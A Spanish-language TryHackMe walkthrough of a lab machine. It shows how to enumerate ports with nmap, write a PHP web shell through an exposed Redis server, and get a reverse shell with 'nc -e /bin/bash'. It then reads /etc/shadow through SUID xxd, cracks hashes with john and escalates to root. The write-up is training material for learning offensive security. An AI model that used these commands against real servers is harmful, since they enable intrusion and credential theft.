Bienvenidos a otra sala de tryhackme, en esta ocasion utilizaremos nuestra herramienta bien conocida para escanear puertos abiertos, abusamos de un servicio del sistema para generar nuestra reverse shell en nuestra maquina atacante. Luego, escalaremos privilegios listando los permisos elevados del sistema, crackearemos las credenciales del usuario y escalar a usuario root de una manera muy simple.


# Recon
Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-03 04:23:03 EDT for 24s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   syn-ack ttl 63 Redis key-value store 6.0.7

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 2 puertos abiertos. Al navegar al servidor web, vemos que pertenece al servicio apache, podriamos realizar una enumeracion con gobuster para descubrir directorios ocultos pero observamos el otro puerto que pertenece al servicio redis. Redis es un sistema de almacenaciento de datos de memoria.

Podemos consultar https://book.hacktricks.xyz/ para saber como explotar este servicio.

# Intrusion

Si miramos el manual propocionado anteriormente, nos dira diferentes formas sobre como explotar distintos servicios. En nuestro caso, nos interesa el metodo **PHP WEBSHELL**
Si no tenes instalado las herramientas redis, podes instalarlas de la siguiente manera : `sudo apt-get install redis-tools`.

Primero, nos aseguraremos en agregar una instruccion, en codigo php, que nos refleje la configuracion y version php del sistema. Tenemos que saber la ruta del servidor web, por lo general, en una distribucion ubuntu se almancenan en /var/www/html.

```bash
config set dir /var/www/html # Seleccionamos y configuramos directorio
config set dbfilename info.php # Creamos archivo info.php
set test "<?php phpinfo(); ?>" # Instruccion php para saber confguracion del sys
save

Navegamos a http://IPTARGET/info.php
```

Como vemos que funciona, podemos realizar otra configuracion que nos de una reverse shell en nuestra maquina atacante.

```bash
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save

# En nuestra maquina atacante nos ponemos en escucha

nc -nvlp LPORT

# Navegamos al servidor web donde configuramos nuestra shell

http://IPTARGET/shell.php?cmd=nc -e /bin/bash LHOST LPORT

# Upgradeamos nuestra shell

script /dev/null -c bash
  CTRL+Z
  stty raw -echo;fg
  export TERM=xterm
```


# Priv. Escalation

Listaremos permisos elevados dentro del sistema 

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Podemos abusarnos del permiso **xxd**, nos dirigimos a la pagina de https://gtfobins.github.io/gtfobins/xxd/ que nos indicara como poder abusarnos de esta vulnerabilidad. Basicamente,tenemos que indicarle el archivo que querramos leer y ejecutamos un comando que nos dara el contenido de dicho archivo. 

```bash
LFILE=file_to_read
xxd "$LFILE" | xxd -r
```

Usaremos las rutas de /etc/passwd y /etc/shadow, que por suerte tenemos los privilegios adecuados para leer su contenido. Luego utilizamos **john** con su opcion de unshadow que nos permite poder crackear sus credenciales.

```bash
LFILE=/etc/passwd
xxd "$LFILE" | xxd -r

LFIE=/etc/shadow
xxd "$LFILE" | xxd -r

# Copiaremos y nos pasaremos el contenido a nuestra maquina atacante con los nombres passwd.txt shadow.txt

Utilizamos john para crackear la credencial de vianka

unshadow passwd.txt shadow.txt > hash.txt
john --wordlist=Path/Wordlist hash.txt

```

Ya tenemos nuestra password y escalaremos ahora a usuario raiz root.

```bash
su vianka # cambiamos a usuario vianka
sudo -l # listamos permisos de superusuario
sudo su # cambiamos a usuario root.
```


